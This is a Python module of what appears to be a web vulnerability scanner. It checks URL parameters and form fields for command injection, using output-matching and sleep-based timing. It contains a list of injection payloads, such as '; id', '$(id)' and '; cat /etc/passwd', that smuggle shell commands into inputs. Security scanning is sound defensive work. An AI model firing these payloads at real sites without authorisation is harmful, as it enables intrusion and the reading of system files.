"""Remote Code Execution Scanner — OWASP A03:2021."""
import re
import time
from core.base_scanner import BaseScanner
from core.logger import vuln

RCE_PAYLOADS = [
    ("; id",             r"uid=\d+"),
    ("| id",             r"uid=\d+"),
    ("`id`",             r"uid=\d+"),
    ("; whoami",         r"root|www-data|apache|nginx"),
    ("$(id)",            r"uid=\d+"),
    ("; cat /etc/passwd",r"root:.*:0:0:"),
    ("& dir",            r"Volume in drive|Directory of"),
    ("|id",              r"uid=\d+"),
    ("1; id",            r"uid=\d+"),
    ("127.0.0.1; id",    r"uid=\d+"),
    ("8.8.8.8 && id",    r"uid=\d+"),
]
TIME_PAYLOADS = [
    ("; sleep 5 #", 4.5),
    ("| sleep 5",   4.5),
    ("1; sleep 5",  4.5),
    ("; ping -c 5 127.0.0.1", 4.0),
]
SKIP_FIELD_RE = re.compile(r"token|csrf|nonce|_method|authenticity", re.IGNORECASE)


class RCEScanner(BaseScanner):
    MODULE_NAME = "rce"
    OWASP_CATEGORY = "A03:2021 - Injection"

    def scan(self, urls: list) -> list:
        findings = []
        tested = set()

        for url in urls:
            for param in self.get_url_params(url):
                key = f"url:{url}:{param}"
                if key in tested:
                    continue
                tested.add(key)
                findings.extend(self._test_param(url, param))

            for form in self.get_forms(url):
                for field in form["inputs"]:
                    if SKIP_FIELD_RE.search(field):
                        continue
                    key = f"form:{form['url']}:{field}"
                    if key in tested:
                        continue
                    tested.add(key)
                    findings.extend(self._test_form_field(form, field))

        return findings

    def _test_param(self, url, param):
        findings = []
        for payload, sig in RCE_PAYLOADS:
            resp = self.session.get(self.inject_param(url, param, payload))
            if resp and re.search(sig, resp.text):
                findings.append(self.make_finding(
                    url=url, param=param, payload=payload,
                    evidence=re.search(sig, resp.text).group(0),
                    severity="CRITICAL",
                    description=f"RCE: command output in response for param '{param}'.",
                    remediation="Never pass user input to shell commands. Use safe APIs.",
                ))
                vuln(f"  [VULN] RCE @ {url} param={param}")
                break
        for payload, threshold in TIME_PAYLOADS:
            t0 = time.time()
            self.session.get(self.inject_param(url, param, payload))
            if time.time() - t0 >= threshold:
                findings.append(self.make_finding(
                    url=url, param=param, payload=payload,
                    evidence=f"Response delayed {time.time()-t0:.1f}s",
                    severity="CRITICAL",
                    description=f"Time-based RCE (sleep) in param '{param}'.",
                    remediation="Never pass user input to shell commands.",
                ))
                vuln(f"  [VULN] RCE (time) @ {url} param={param}")
                break
        return findings

    def _test_form_field(self, form, field):
        findings = []
        for payload, sig in RCE_PAYLOADS[:6]:
            results = self.test_form(form, payload, field_override=field)
            for _, resp in results:
                if resp and re.search(sig, resp.text):
                    findings.append(self.make_finding(
                        url=form["url"], param=field, payload=payload,
                        evidence=re.search(sig, resp.text).group(0),
                        severity="CRITICAL",
                        description=f"RCE via form field '{field}'.",
                        remediation="Never pass user input to shell commands.",
                    ))
                    vuln(f"  [VULN] RCE (form) @ {form['url']} field={field}")
                    return findings
        return findings
